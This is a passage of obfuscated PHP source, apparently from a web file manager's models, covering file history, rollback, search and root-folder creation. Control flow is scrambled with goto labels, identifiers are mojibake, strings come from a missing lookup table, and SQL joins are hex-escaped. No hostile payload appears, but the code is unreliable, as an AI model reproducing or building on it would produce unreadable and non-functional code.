$cå§Íóñì‰ = array_slice($cå§Íóñì‰, $FÈ¼½»ÏÏİ); if (!$EÕ±ïõ¤® || !$cå§Íóñì‰) { return; } goto c‹ˆ£‚èğ¿; A¨Ğ¤¾Û“ó: if (!$a«Ï†ÀÜ || $FÈ¼½»ÏÏİ >= count($a«Ï†ÀÜ)) { return; } $EÕ±ïõ¤® = array_to_keyvalue($a«Ï†ÀÜ, $B‡ùíìá¼[33], $B‡ùíìá¼[363]); $EÕ±ïõ¤® = array_slice($EÕ±ïõ¤®, $FÈ¼½»ÏÏİ); goto AÁ›µÑ©¬; c‹ˆ£‚èğ¿: $c¬öÌ „œÀ = array($B‡ùíìá¼[381] => array($B‡ùíìá¼[7], $EÕ±ïõ¤®)); $this->where($c¬öÌ „œÀ)->delete(); Model($B‡ùíìá¼[417])->remove($cå§Íóñì‰); goto fÑ‘×÷Ş; B‰Ù½ÉÉÌÖ: $bòŠ‚‡¨« = $aÚçƒœƒ©â == $B‡ùíìá¼[2257] ? 3 : $fğ—°¬ÚˆÌ; if ($fğ—°¬ÚˆÌ <= 1) { $bòŠ‚‡¨« = 1; } $FÈ¼½»ÏÏİ = $bòŠ‚‡¨« - 1; goto eÅäë¹Å±î; fÑ‘×÷Ş: } public function listData($FÔ ²’Ğö“) { goto f³’¾õá“‰; DÑ®àƒ½Œà: $Cí÷–³Šˆ = 3; if ($f•Æê—­±æ == $D¶¶‡ˆßÄç[2257]) { $fêâä‰‰ø·[$D¶¶‡ˆßÄç[350]] = array_slice($fêâä‰‰ø·[$D¶¶‡ˆßÄç[350]], 0, $Cí÷–³Šˆ); $fêâä‰‰ø·[$D¶¶‡ˆßÄç[347]] = array($D¶¶‡ˆßÄç[2260] => 1, $D¶¶‡ˆßÄç[2261] => 20, $D¶¶‡ˆßÄç[2262] => 1, $D¶¶‡ˆßÄç[2263] => count($fêâä‰‰ø·[$D¶¶‡ˆßÄç[350]])); } return $fêâä‰‰ø·; goto e¤‘ó™§ã; eø§§ÊÃ×: $fêâä‰‰ø· = $this->field($eÕ†Õªæ‹‰)->where($DÊê‘®óÍÛ)->order($D¶¶‡ˆßÄç[2250])->selectPage(); $this->_listAppendUser($fêâä‰‰ø·[$D¶¶‡ˆßÄç[350]]); $f•Æê—­±æ = Model($D¶¶‡ˆßÄç[1079])->get($D¶¶‡ˆßÄç[2256]); goto DÑ®àƒ½Œà; f³’¾õá“‰: $D¶¶‡ˆßÄç =& $_SERVER[õëù©û]; $DÊê‘®óÍÛ = array($D¶¶‡ˆßÄç[379] => $FÔ ²’Ğö“); $eÕ†Õªæ‹‰ = $D¶¶‡ˆßÄç[2259]; goto eø§§ÊÃ×; e¤‘ó™§ã: } protected function _listAppendUser(&$cŠˆÃ“Ş¦ó) { $cöÕ¼Ğƒôí =& $_SERVER[õëù©û]; $f¸ê–×ö×É = array_to_keyvalue($cŠˆÃ“Ş¦ó, $cöÕ¼Ğƒôí[33], $cöÕ¼Ğƒôí[1404]); $BÜŠ®Ÿå°– = Model($cöÕ¼Ğƒôí[472])->userListInfo($f¸ê–×ö×É); foreach ($cŠˆÃ“Ş¦ó as &$EÌÖ±¤ÖÑ†) { $bßó‚‰òé = $EÌÖ±¤ÖÑ†[$cöÕ¼Ğƒôí[1404]]; $EÌÖ±¤ÖÑ†[$cöÕ¼Ğƒôí[374]] = $BÜŠ®Ÿå°–[$bßó‚‰òé] ? $BÜŠ®Ÿå°–[$bßó‚‰òé] : !1; } } public function fileInfo($eÀ°¿äöå) { $B¿‘ßù =& $_SERVER[õëù©û]; $B¦š¿¯—í = $this->tablePrefix; $bâƒÏñ¤Ò» = "{$B¦š¿¯—í}\151\x6f\x5f\x66\151\x6c\145\40\146\151\154\x65\163\40\x6f\156\x20\x66\151\x6c\x65\x73\56\146\151\x6c\x65\111\104\x20\75\x20\150\x69\x73\164\x6f\x72\x79\56\x66\151\x6c\x65\x49\x44"; return $this->alias($B¿‘ßù[2264])->where(array($B¿‘ßù[381] => $eÀ°¿äöå))->join($bâƒÏñ¤Ò», $B¿‘ßù[2265])->find(); } public function removeItem($f×ÄøÛ‘Î ) { $E Ö¬éõòĞ =& $_SERVER[õëù©û]; $f Î“¶á» = array($E Ö¬éõòĞ[381] => $f×ÄøÛ‘Î ); $A§£›®¤ß = $this->where($f Î“¶á»)->find(); if ($A§£›®¤ß) { $f¡Šíãäï = $this->where($f Î“¶á»)->delete(); Model($E Ö¬éõòĞ[417])->remove($A§£›®¤ß[$E Ö¬éõòĞ[414]]); return $f¡Šíãäï; } return !1; } public function removeBySource($dËÚØ½Ü¨Ì) { goto B·ÚÇíÆö…; eæñ‚¾ßŒ: return !0; goto aé“éâ©Ó¥; B·ÚÇíÆö…: $E¾¢ì¡„ =& $_SERVER[õëù©û]; if (!$dËÚØ½Ü¨Ì) { return !1; } if (!is_array($dËÚØ½Ü¨Ì)) { $dËÚØ½Ü¨Ì = array($dËÚØ½Ü¨Ì); } goto A’ÙçéÅ¦½; A’ÙçéÅ¦½: $d‡½¼°º¯ = array($E¾¢ì¡„[379] => array($E¾¢ì¡„[7], $dËÚØ½Ü¨Ì)); $aÌ®·Éß¤È = $this->field($E¾¢ì¡„[415])->where($d‡½¼°º¯)->select(); if ($aÌ®·Éß¤È) { $this->where($d‡½¼°º¯)->delete(); $cÑÇÚÇàÀÂ = array_to_keyvalue($aÌ®·Éß¤È, $E¾¢ì¡„[33], $E¾¢ì¡„[414]); Model($E¾¢ì¡„[417])->remove($cÑÇÚÇàÀÂ); } goto eæñ‚¾ßŒ; aé“éâ©Ó¥: } public function setDetail($c¼¥«’ô¤Å, $AğÚØæ‰…) { $D†…ä‰í¥î =& $_SERVER[õëù©û]; return $this->where(array($D†…ä‰í¥î[381] => $c¼¥«’ô¤Å))->save(array($D†…ä‰í¥î[2253] => $AğÚØæ‰…)); } public function rollbackToItem($cƒÁ¥ †Ò‡, $b¨Ü‡šÌæª) { goto dÔ‡Öõ÷ÈÖ; dÔ‡Öõ÷ÈÖ: $CÌµÕã Ğò =& $_SERVER[õëù©û]; $FÌ“Š’‡ˆ = Model($CÌµÕã Ğò[747])->sourceInfo($cƒÁ¥ †Ò‡); $this->addHistory($FÌ“Š’‡ˆ); goto c”¾ùà§¨‡; bğÃ…ˆô¬: return $this->where(array($CÌµÕã Ğò[381] => $b¨Ü‡šÌæª))->delete(); goto cöØŸ‘í¹; c”¾ùà§¨‡: $aˆç´¢âº = $this->find($b¨Ü‡šÌæª); $eÏ…ÁßÑòö = array($CÌµÕã Ğò[414] => $aˆç´¢âº[$CÌµÕã Ğò[414]], $CÌµÕã Ğò[77] => $aˆç´¢âº[$CÌµÕã Ğò[77]], $CÌµÕã Ğò[106] => time(), $CÌµÕã Ğò[375] => USER_ID); Model($CÌµÕã Ğò[747])->where(array($CÌµÕã Ğò[365] => $cƒÁ¥ †Ò‡))->save($eÏ…ÁßÑòö); goto bğÃ…ˆô¬; cöØŸ‘í¹: } public function clearSame($d—ùËñÕà) { goto B•–“™Øí; D¿Õ‹ŠŸ‘…: if (!$b°ÜµØÀ™È) { return; } $this->where(array($fÀÆ‹£Ø°×[363] => array($fÀÆ‹£Ø°×[7], $b°ÜµØÀ™È)))->delete(); Model($fÀÆ‹£Ø°×[417])->remove($AÌÆ»æñ–ß); goto Fí¶Ëá´¯¥; B•–“™Øí: $fÀÆ‹£Ø°× =& $_SERVER[õëù©û]; $fİ­ËÆÓÅ = $this->listData($d—ùËñÕà); $A‹ÜÕ³Ö«Ê = array_to_keyvalue_group($fİ­ËÆÓÅ, $fÀÆ‹£Ø°×[414]); goto AŠ¼Üî«Ä; AŠ¼Üî«Ä: $AÌÆ»æñ–ß = array(); $b°ÜµØÀ™È = array(); foreach ($A‹ÜÕ³Ö«Ê as $aõ÷…İñÓÄ) { if (!$aõ÷…İñÓÄ || count($aõ÷…İñÓÄ) <= 1) { continue; } foreach ($aõ÷…İñÓÄ as $A§¦‹ÈéÂï) { $AÌÆ»æñ–ß[] = $A§¦‹ÈéÂï[$fÀÆ‹£Ø°×[414]]; $b°ÜµØÀ™È[] = $A§¦‹ÈéÂï[$fÀÆ‹£Ø°×[363]]; } } goto D¿Õ‹ŠŸ‘…; Fí¶Ëá´¯¥: } public function userSpace() { $bŸêÅØâ‘ù =& $_SERVER[õëù©û]; $E‚˜Åù¨’ƒ = $this->tablePrefix; $Böëîóä‘ï = array($bŸêÅØâ‘ù[1395] => USER_ID); $e¼ˆÀ˜¤Ãô = "{$E‚˜Åù¨’ƒ}\x69\x6f\x5f\x66\x69\x6c\x65\x20\x66\x69\154\145\163\x20\x6f\x6e\40\x66\x69\x6c\x65\x73\56\146\151\154\145\x49\104\40\x3d\40\x68\x69\x73\x74\x6f\x72\x79\x2e\146\x69\154\x65\111\x44"; return $this->alias($bŸêÅØâ‘ù[2264])->where($Böëîóä‘ï)->join($e¼ˆÀ˜¤Ãô, $bŸêÅØâ‘ù[2265])->sum($bŸêÅØâ‘ù[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($fàÕ©äÙ») { goto Aµ…í¥õ±Ô; Cš—î‹‰Å: if (!$dçĞ¥»—„Ó) { return array(); } $cĞÅØ•°â = $dçĞ¥»—„Ó[$DîŒ¨·ôˆ[156]]; $c¾áß‹¿Æö = $DîŒ¨·ôˆ[7]; goto d„ËÌœ¿; d„ËÌœ¿: if (!$dçĞ¥»—„Ó[$DîŒ¨·ôˆ[156]]) { $bÉŠˆƒ†‘² = array_to_keyvalue($b¨Ü¢‹æĞÂ, $DîŒ¨·ôˆ[33], $DîŒ¨·ôˆ[156]); $cĞÅØ•°â = implode($DîŒ¨·ôˆ[47], $bÉŠˆƒ†‘²); $c¾áß‹¿Æö = $DîŒ¨·ôˆ[2222]; } $aÕÊ­àÅ„Û = explode($DîŒ¨·ôˆ[47], trim($cĞÅØ•°â, $DîŒ¨·ôˆ[47])); return array($c¾áß‹¿Æö, $aÕÊ­àÅ„Û); goto cÓ½Û½øİÛ; Aµ…í¥õ±Ô: $DîŒ¨·ôˆ =& $_SERVER[õëù©û]; $b¨Ü¢‹æĞÂ = KodIO::fileTypeList(); $dçĞ¥»—„Ó = $b¨Ü¢‹æĞÂ[$fàÕ©äÙ»]; goto Cš—î‹‰Å; cÓ½Û½øİÛ: } public function listPathType($Cø£·êîåÜ) { $a¨‰¨“³å” =& $_SERVER[õëù©û]; $dåß¶šÎ = $this->fileTypeWhere($Cø£·êîåÜ); if (!$dåß¶šÎ) { return array(); } $f‡†Ã ¤§ = array($a¨‰¨“³å”[516] => SourceModel::TYPE_USER, $a¨‰¨“³å”[517] => USER_ID, $a¨‰¨“³å”[513] => 0, $a¨‰¨“³å”[514] => $dåß¶šÎ); return $this->listSource($f‡†Ã ¤§); } public function listSearch($aŠ±¯ó„», $f»õËèê„ = 300) { goto eø¶—ÖËÈ–; D™­æè˜£: $this->_listSearchDesc($b­£®Ä¬Ã‘, $aŠ±¯ó„», $E¤Íšèä‚Ö); $this->_listSearchTag($b­£®Ä¬Ã‘, $aŠ±¯ó„», $E¤Íšèä‚Ö); $this->_listDataApply($b­£®Ä¬Ã‘[$AÇÊïµİ š[350]]); goto e™ª†ˆŞ¸˜; D·×¹‰¡‹Á: if (!isset($e¨²÷‘¦æ[$AÇÊïµİ š[392]])) { $e¨²÷‘¦æ[$AÇÊïµİ š[392]] = 0; } $EãˆÚÇÑµ = $AÇÊïµİ š[2267]; $E¤Íšèä‚Ö = $EãˆÚÇÑµ; goto D›™ˆ¼œÂç; eø¶—ÖËÈ–: $AÇÊïµİ š =& $_SERVER[õëù©û]; if (isset($aŠ±¯ó„»[$AÇÊïµİ š[2144]]) && $aŠ±¯ó„»[$AÇÊïµİ š[2144]]) { $aŠ±¯ó„»[$AÇÊïµİ š[2144]] = str_replace($AÇÊïµİ š[1557], $AÇÊïµİ š[2266], trim($aŠ±¯ó„»[$AÇÊïµİ š[2144]])); } $e¨²÷‘¦æ = $this->_parseSearchWhere($aŠ±¯ó„»); goto D·×¹‰¡‹Á; D›™ˆ¼œÂç: $this->_listSearchBindPinyin($aŠ±¯ó„», $e¨²÷‘¦æ, $EãˆÚÇÑµ); $this->alias($AÇÊïµİ š[482])->_makeOrder()->cache(null, 10); $b­£®Ä¬Ã‘ = $this->distinct(!0)->field($EãˆÚÇÑµ)->where($e¨²÷‘¦æ)->selectPage($f»õËèê„); goto D™­æè˜£; e™ª†ˆŞ¸˜: $this->_listMake($b­£®Ä¬Ã‘); return $b­£®Ä¬Ã‘; goto F´Îéô½‹Á; F´Îéô½‹Á: } private function _listSearchTag(&$bã«Ò²‰àÛ, $c‰Ìâ²“ïº, $B¯ãœÜãœ) { goto BçÅêñôÓ´; DÇâÖ°…„: $CÖİç¥…¿ = array(); $c•ã‚µØÒ = $c‰Ìâ²“ïº[$CŸİ§­¹×[2144]]; foreach ($Bó‚Œ—«‡ö as $bìøèœ¿ŸØ) { $eá—È‹² = $bìøèœ¿ŸØ[$CŸİ§­¹×[28]]; $AÃØÖ‹ÃÑ = str_replace($CŸİ§­¹×[50], $CŸİ§­¹×[33], Pinyin::encode($eá—È‹²)); if (stripos($eá—È‹², $c•ã‚µØÒ) !== !1 || stripos($AÃØÖ‹ÃÑ, $c•ã‚µØÒ) !== !1) { $CÖİç¥…¿[] = $bìøèœ¿ŸØ[$CŸİ§­¹×[363]]; } } goto báŸò¶Ì; Eßù¥ë½Ø: $f²«ôŞæ¼Ô = array_to_keyvalue($f²«ôŞæ¼Ô, $CŸİ§­¹×[33], $CŸİ§­¹×[75]); $A™÷ğÅê˜İ = array_unique($f²«ôŞæ¼Ô); $this->_listSearchMerge($bã«Ò²‰àÛ, $c‰Ìâ²“ïº, $B¯ãœÜãœ, $A™÷ğÅê˜İ); goto E¦ç†Û; báŸò¶Ì: if (!$CÖİç¥…¿) { return; } $AŒÄ·¨ø­½ = array($CŸİ§­¹×[389] => array($CŸİ§­¹×[7], $CÖİç¥…¿)); $f²«ôŞæ¼Ô = Model($CŸİ§­¹×[2269])->field($CŸİ§­¹×[75])->where($AŒÄ·¨ø­½)->select(); goto Eßù¥ë½Ø; BçÅêñôÓ´: $CŸİ§­¹× =& $_SERVER[õëù©û]; if (!$c‰Ìâ²“ïº[$CŸİ§­¹×[2144]] || $bã«Ò²‰àÛ[$CŸİ§­¹×[347]][$CŸİ§­¹×[336]] > 1) { return; } $Bó‚Œ—«‡ö = Model($CŸİ§­¹×[2268])->listData(); goto DÇâÖ°…„; E¦ç†Û: } private function _listSearchDesc(&$Cï¯Š§®šÃ, $F°îªë½ˆº, $A´©¢ô¤®Ş) { goto eôÚîŠõ; eôÚîŠõ: $B¼¯´³ç× =& $_SERVER[õëù©û]; if (!$F°îªë½ˆº[$B¼¯´³ç×[2144]] || $Cï¯Š§®šÃ[$B¼¯´³ç×[347]][$B¼¯´³ç×[336]] > 1) { return; } $dŒÈ¥õËÀ = $this->listSearchChildren($F°îªë½ˆº[$B¼¯´³ç×[456]]); goto BòÅ©ÜÇ‡; BòÅ©ÜÇ‡: $dŒÈ¥õËÀ = array_unique($dŒÈ¥õËÀ); if (!$dŒÈ¥õËÀ) { return; } $Dº¶ßÜàä´ = array($B¼¯´³ç×[365] => array($B¼¯´³ç×[7], $dŒÈ¥õËÀ), $B¼¯´³ç×[89] => $B¼¯´³ç×[400], $B¼¯´³ç×[355] => array($B¼¯´³ç×[746], $B¼¯´³ç×[2146] . $F°îªë½ˆº[$B¼¯´³ç×[2144]] . $B¼¯´³ç×[2146])); goto bºù¶Õ­µ‘; bºù¶Õ­µ‘: $AâÛŒêƒù = Model($B¼¯´³ç×[499])->field($B¼¯´³ç×[365])->where($Dº¶ßÜàä´)->select(); $aø²Ï‰ª–ª = array_to_keyvalue($AâÛŒêƒù, $B¼¯´³ç×[33], $B¼¯´³ç×[365]); $this->_listSearchMerge($Cï¯Š§®šÃ, $F°îªë½ˆº, $A´©¢ô¤®Ş, $aø²Ï‰ª–ª); goto A‹¡™¾¢¿Ÿ; A‹¡™¾¢¿Ÿ: } private function _listSearchMerge(&$dˆ„ù½ùô, $bâ›šŸÛ‰, $Bƒæ›ëµ‰Ú, $dæ‚Ìİö¢Ü) { goto Dà½—–¦â; dÛšˆÜÕ¢: $b´õ‘«¸Ú‘ = $this->field($Bƒæ›ëµ‰Ú)->where($dßµÃŠİĞ½)->select(); if (!$b´õ‘«¸Ú‘) { return; } $bÙ°Üèçšá = array(); goto f Ä³œÔä»; eÁ„ê™àÕˆ: $a›ª‚²¦âê = array_diff($dæ‚Ìİö¢Ü, $fÍï•­¢Óİ); if (!$a›ª‚²¦âê) { return; } $dßµÃŠİĞ½ = array($f‡µİñø´¤[365] => array($f‡µİñø´¤[7], $a›ª‚²¦âê)); goto dÛšˆÜÕ¢; f Ä³œÔä»: foreach ($b´õ‘«¸Ú‘ as $fÒ¯áŒĞÌ) { $eˆóÕê ¬É = $f‡µİñø´¤[47] . $bâ›šŸÛ‰[$f‡µİñø´¤[456]] . $f‡µİñø´¤[47]; if (stripos($fÒ¯áŒĞÌ[$f‡µİñø´¤[454]], $eˆóÕê ¬É) !== !1) { $bÙ°Üèçšá[] = $fÒ¯áŒĞÌ; } } $dˆ„ù½ùô[$f‡µİñø´¤[350]] = array_merge($bÙ°Üèçšá, $dˆ„ù½ùô[$f‡µİñø´¤[350]]); $dˆ„ù½ùô[$f‡µİñø´¤[347]][$f‡µİñø´¤[348]] += count($bÙ°Üèçšá); goto Dš³Êƒåæë; Dà½—–¦â: $f‡µİñø´¤ =& $_SERVER[õëù©û]; if (!$dæ‚Ìİö¢Ü) { return; } $fÍï•­¢Óİ = array_to_keyvalue($dˆ„ù½ùô[$f‡µİñø´¤[350]], $f‡µİñø´¤[33], $f‡µİñø´¤[365]); goto eÁ„ê™àÕˆ; Dš³Êƒåæë: } public function listSearchChildren($B¸¢§µËÖˆ, $dˆ¢Â§èƒÃ = 5000) { goto F¦ç×Üò´; E¯Ä¦­·äœ: $dÁª÷Ó¤¿´ = $this->field($D”ë“ïÛÔ³[365])->where($D¼÷ÓºÅÈ)->select(); $F÷‰©Šß„ƒ = array_to_keyvalue($dÁª÷Ó¤¿´, $D”ë“ïÛÔ³[33], $D”ë“ïÛÔ³[365]); return $F÷‰©Šß„ƒ; goto DØİ¸®Éé; CÒ¼Áß„Ïù: $D¼÷ÓºÅÈ = array($D”ë“ïÛÔ³[454] => array($D”ë“ïÛÔ³[746], $aŒ§ˆïÍ¦Ï[$D”ë“ïÛÔ³[454]] . $aŒ§ˆïÍ¦Ï[$D”ë“ïÛÔ³[365]] . $D”ë“ïÛÔ³[479])); $aö•ÏÉ‚ó‹ = $this->field($D”ë“ïÛÔ³[365])->cache(null, 600)->where($D¼÷ÓºÅÈ)->count(); if ($aö•ÏÉ‚ó‹ > $dˆ¢Â§èƒÃ) { return $this->_listSearchChildrenNear($B¸¢§µËÖˆ, $dˆ¢Â§èƒÃ); } goto E¯Ä¦­·äœ; F¦ç×Üò´: $D”ë“ïÛÔ³ =& $_SERVER[õëù©û]; $F÷‰©Šß„ƒ = array(); $aŒ§ˆïÍ¦Ï = $this->sourceInfo($B¸¢§µËÖˆ); goto CÒ¼Áß„Ïù; DØİ¸®Éé: } private function _listSearchChildrenNear($a¹İ­¹Í¡Æ, $a’äìïì„) { goto F­¯¿¿Å”…; F­¯¿¿Å”…: $bÇ„àïÎ® =& $_SERVER[õëù©û]; $fÜ¨ùÕÆ = array(); $Dä”˜ØÑå¢ = array($bÇ„àïÎ®[456] => $a¹İ­¹Í¡Æ); goto fâáæÙ˜›Š; Eï•¥Ö¸¥: $fÜ¨ùÕÆ = array_merge($fÜ¨ùÕÆ, array_to_keyvalue($AŸºÒ…Èšè, $bÇ„àïÎ®[33], $bÇ„àïÎ®[365])); $fÜ¨ùÕÆ = array_slice($fÜ¨ùÕÆ, 0, $a’äìïì„); return $fÜ¨ùÕÆ; goto cğé–”è¾Œ; EìÑ™ä´ä‡: if (!$fğÓÕ§¦Ø¤) { return $fÜ¨ùÕÆ; } $Dä”˜ØÑå¢ = array($bÇ„àïÎ®[456] => array($bÇ„àïÎ®[7], $fğÓÕ§¦Ø¤)); $AŸºÒ…Èšè = $this->field($bÇ„àïÎ®[2270])->where($Dä”˜ØÑå¢)->select(); goto Eï•¥Ö¸¥; fâáæÙ˜›Š: $AŸºÒ…Èšè = $this->field($bÇ„àïÎ®[2270])->where($Dä”˜ØÑå¢)->select(); $fğÓÕ§¦Ø¤ = array_to_keyvalue(array_filter_by_field($AŸºÒ…Èšè, $bÇ„àïÎ®[366], $bÇ„àïÎ®[83]), $bÇ„àïÎ®[33], $bÇ„àïÎ®[365]); $fÜ¨ùÕÆ = array_merge($fÜ¨ùÕÆ, array_to_keyvalue($AŸºÒ…Èšè, $bÇ„àïÎ®[33], $bÇ„àïÎ®[365])); goto EìÑ™ä´ä‡; cğé–”è¾Œ: } private function _listSearchBindPinyin($AºÃßéñÁš, &$dÂ®’ÅºåË, &$eÄ¦ôÎ‹­Ã) { goto Cğ›ôèœ; B·Äö¶ƒ›: $Aù–ïÃà‰œ[] = array($d’ãÆò[2274] => $Bâ‡õò½´, $d’ãÆò[907] => $d’ãÆò[2148], array($d’ãÆò[2275] => $Bâ‡õò½´, $d’ãÆò[2276] => array($d’ãÆò[7], array($d’ãÆò[411], $d’ãÆò[410])))); $this->join($E×Æ©—¨ç“); $dÂ®’ÅºåË = $Aù–ïÃà‰œ; goto eØÈ‘‚Òê‚; DÊÓÙ©÷µ: unset($dÂ®’ÅºåË[$d’ãÆò[28]]); foreach ($dÂ®’ÅºåË as $b¬™‘äÅ‚ => $C‚Ç§ÄæøÛ) { $Aù–ïÃà‰œ[$d’ãÆò[2272] . $b¬™‘äÅ‚] = $C‚Ç§ÄæøÛ; } $Bâ‡õò½´ = array($d’ãÆò[478], $d’ãÆò[2146] . $AºÃßéñÁš[$d’ãÆò[2144]] . $d’ãÆò[2146]); goto B·Äö¶ƒ›; c”Ç›»éè: $Aù–ïÃà‰œ = array(); $eÄ¦ôÎ‹­Ã = str_replace(array($d’ãÆò[213], $d’ãÆò[50], $d’ãÆò[2271]), $d’ãÆò[33], $eÄ¦ôÎ‹­Ã); $eÄ¦ôÎ‹­Ã = $d’ãÆò[2272] . str_replace($d’ãÆò[47], $d’ãÆò[2273], $eÄ¦ôÎ‹­Ã); goto DÊÓÙ©÷µ; Cğ›ôèœ: $d’ãÆò =& $_SERVER[õëù©û]; if (!Input::check($AºÃßéñÁš[$d’ãÆò[2144]], $d’ãÆò[302]) || strlen($AºÃßéñÁš[$d’ãÆò[2144]]) < 2) { return; } $E×Æ©—¨ç“ = "\114\x45\x46\124\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\151\157\x5f\x73\157\165\x72\x63\145\x5f\155\x65\164\141\x20\155\x65\x74\x61\x20\157\156\40\x73\x6f\165\162\x63\x65\56\x73\x6f\x75\x72\x63\145\x49\104\x20\75\40\155\145\164\141\x2e\163\x6f\165\162\143\145\x49\x44"; goto c”Ç›»éè; eØÈ‘‚Òê‚: } private function _parseSearchWhere($EàâìñÍÚÎ) { goto Fõ‰ÎÚ§ªˆ; Fõ‰ÎÚ§ªˆ: $Cé´“¦‘å =& $_SERVER[õëù©û]; $FæÄ³ä„½ = array(); if (isset($EàâìñÍÚÎ[$Cé´“¦‘å[697]])) { $FæÄ³ä„½[$Cé´“¦‘å[106]] = array($Cé´“¦‘å[2277], $EàâìñÍÚÎ[$Cé´“¦‘å[697]]); } goto Cô‹à¯; Cô‹à¯: if (isset($EàâìñÍÚÎ[$Cé´“¦‘å[698]])) { $AÆ†ë«ÕÃ = array($Cé´“¦‘å[2278], $EàâìñÍÚÎ[$Cé´“¦‘å[698]]); if ($FæÄ³ä„½[$Cé´“¦‘å[106]]) { $FæÄ³ä„½[$Cé´“¦‘å[106]] = array($FæÄ³ä„½[$Cé´“¦‘å[106]], $AÆ†ë«ÕÃ, $Cé´“¦‘å[2279]); } else { $FæÄ³ä„½[$Cé´“¦‘å[106]] = $AÆ†ë«ÕÃ; } } if (isset($EàâìñÍÚÎ[$Cé´“¦‘å[2280]])) { $FæÄ³ä„½[$Cé´“¦‘å[77]] = array($Cé´“¦‘å[2277], $EàâìñÍÚÎ[$Cé´“¦‘å[2280]]); } if (isset($EàâìñÍÚÎ[$Cé´“¦‘å[2281]])) { $AÆ†ë«ÕÃ = array($Cé´“¦‘å[2278], $EàâìñÍÚÎ[$Cé´“¦‘å[2281]]); if ($FæÄ³ä„½[$Cé´“¦‘å[77]]) { $FæÄ³ä„½[$Cé´“¦‘å[77]] = array($FæÄ³ä„½[$Cé´“¦‘å[77]], $AÆ†ë«ÕÃ, $Cé´“¦‘å[2279]); } else { $FæÄ³ä„½[$Cé´“¦‘å[77]] = $AÆ†ë«ÕÃ; } } goto f®õßÅŒÀ¨; Eù«÷ï: if (isset($EàâìñÍÚÎ[$Cé´“¦‘å[2144]]) && $EàâìñÍÚÎ[$Cé´“¦‘å[2144]]) { $DÊ†ÇÓ¦ÕÈ = $EàâìñÍÚÎ[$Cé´“¦‘å[2144]]; $e¾ÊÁÆ±Š  = explode($Cé´“¦‘å[50], $DÊ†ÇÓ¦ÕÈ); if (strlen($DÊ†ÇÓ¦ÕÈ) > 2 && (substr($DÊ†ÇÓ¦ÕÈ, 0, 1) == $Cé´“¦‘å[112] && substr($DÊ†ÇÓ¦ÕÈ, -1) == $Cé´“¦‘å[112]) || substr($DÊ†ÇÓ¦ÕÈ, 0, 1) == $Cé´“¦‘å[55] && substr($DÊ†ÇÓ¦ÕÈ, -1) == $Cé´“¦‘å[55]) { $DÊ†ÇÓ¦ÕÈ = substr($DÊ†ÇÓ¦ÕÈ, 1, -1); $e¾ÊÁÆ±Š  = array($DÊ†ÇÓ¦ÕÈ); } $FæÄ³ä„½[$Cé´“¦‘å[28]] = array($Cé´“¦‘å[478], $Cé´“¦‘å[2146] . $DÊ†ÇÓ¦ÕÈ . $Cé´“¦‘å[2146]); if (count($e¾ÊÁÆ±Š ) > 1) { $FæÄ³ä„½[$Cé´“¦‘å[28]] = array(); foreach ($e¾ÊÁÆ±Š  as $CĞ¶È¡··Ò) { if (!trim($CĞ¶È¡··Ò)) { continue; } $FæÄ³ä„½[$Cé´“¦‘å[28]][] = array($Cé´“¦‘å[478], $Cé´“¦‘å[2146] . trim($CĞ¶È¡··Ò) . $Cé´“¦‘å[2146]); } } } return $FæÄ³ä„½; goto cŠ™¦¶öîÉ; f®õßÅŒÀ¨: if (isset($EàâìñÍÚÎ[$Cé´“¦‘å[530]])) { $FæÄ³ä„½[] = array($Cé´“¦‘å[375] => $EàâìñÍÚÎ[$Cé´“¦‘å[530]], $Cé´“¦‘å[374] => $EàâìñÍÚÎ[$Cé´“¦‘å[530]], $Cé´“¦‘å[907] => $Cé´“¦‘å[2148]); } if (isset($EàâìñÍÚÎ[$Cé´“¦‘å[368]])) { $a›»–¾ùÑ = $EàâìñÍÚÎ[$Cé´“¦‘å[368]]; if ($a›»–¾ùÑ == $Cé´“¦‘å[76]) { $FæÄ³ä„½[$Cé´“¦‘å[366]] = 1; } else { if ($a›»–¾ùÑ == $Cé´“¦‘å[2282]) { $FæÄ³ä„½[$Cé´“¦‘å[366]] = 0; } else { if ($a›»–¾ùÑ) { $a›»–¾ùÑ = is_array($a›»–¾ùÑ) ? $a›»–¾ùÑ : explode($Cé´“¦‘å[47], $a›»–¾ùÑ); $FæÄ³ä„½[$Cé´“¦‘å[368]] = array($Cé´“¦‘å[380], $a›»–¾ùÑ); $FæÄ³ä„½[$Cé´“¦‘å[366]] = 0; } } } } if (isset($EàâìñÍÚÎ[$Cé´“¦‘å[456]])) { $eòñ‰»´á¼ = $this->sourceInfo($EàâìñÍÚÎ[$Cé´“¦‘å[456]]); $FæÄ³ä„½[$Cé´“¦‘å[520]] = array($Cé´“¦‘å[478], $eòñ‰»´á¼[$Cé´“¦‘å[454]] . $EàâìñÍÚÎ[$Cé´“¦‘å[456]] . $Cé´“¦‘å[479]); } goto Eù«÷ï; cŠ™¦¶öîÉ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($aÓöî£ˆ®¤) { $f¤ÌÕÖ¸˜‹ =& $_SERVER[õëù©û]; $Dè „ß¦Á = Model($f¤ÌÕÖ¸˜‹[469])->where(array($f¤ÌÕÖ¸˜‹[1395] => $aÓöî£ˆ®¤))->find(); $Bµ¼êƒ³ğ§ = $this->_mkdirRoot(SourceModel::TYPE_USER, $aÓöî£ˆ®¤, $Dè „ß¦Á[$f¤ÌÕÖ¸˜‹[28]]); $this->userDesktopAdd($Bµ¼êƒ³ğ§); return $Bµ¼êƒ³ğ§; } public function userDesktopAdd($E«÷°»ã†) { $D…ĞéË¬Ò½ =& $_SERVER[õëù©û]; $Aæ¤éÚÛ© = LNG($D…ĞéË¬Ò½[2283]); $eôÖÕÔÕğ = $this->mkdir($E«÷°»ã†, $Aæ¤éÚÛ©); $this->metaSet($eôÖÕÔÕğ, $D…ĞéË¬Ò½[2284], $D…ĞéË¬Ò½[83]); $this->metaSet($E«÷°»ã†, $D…ĞéË¬Ò½[2285], $eôÖÕÔÕğ); } public function groupRootAdd($f®Òòõ°ˆÛ) { $AŸâ¹‡•—» =& $_SERVER[õëù©û]; $dÚ‰Ò¨Êâ© = Model($AŸâ¹‡•—»[453])->where(array($AŸâ¹‡•—»[2140] => $f®Òòõ°ˆÛ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $f®Òòõ°ˆÛ, $dÚ‰Ò¨Êâ©[$AŸâ¹‡•—»[28]]); } public function systemRootPathAdd($A×ÉÑÖß¨–) { if ($A×ÉÑÖß¨– != 